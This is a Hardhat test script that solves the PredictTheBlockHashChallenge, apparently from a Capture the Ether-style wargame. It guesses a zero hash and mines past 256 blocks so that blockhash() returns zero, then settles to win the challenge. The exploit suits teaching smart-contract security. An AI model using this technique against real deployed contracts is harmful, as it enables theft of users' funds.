import { expect } from "chai";
import { ethers } from "hardhat";

const { utils, provider } = ethers;

describe("PredictTheBlockHashChallenge", () => {
  it("Solves the challenge", async () => {
    const challengeFactory = await ethers.getContractFactory("PredictTheBlockHashChallenge");
    const challengeContract = await challengeFactory.deploy({ value: utils.parseEther("1") });
    await challengeContract.deployed();

    const lockInGuessTx = await challengeContract.lockInGuess(
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      { value: utils.parseEther("1") },
    );
    await lockInGuessTx.wait();

    const initBlockNumber = await provider.getBlockNumber();

    let lastBlockNumber = initBlockNumber;
    do {
      lastBlockNumber = await provider.getBlockNumber();
      console.log(`Block number: ${lastBlockNumber}`);

      await ethers.provider.send("evm_mine", []);
    } while (lastBlockNumber - initBlockNumber < 256);

    const attackTx = await challengeContract.settle();
    await attackTx.wait();

    expect(await challengeContract.isComplete()).to.be.true;
  });
});
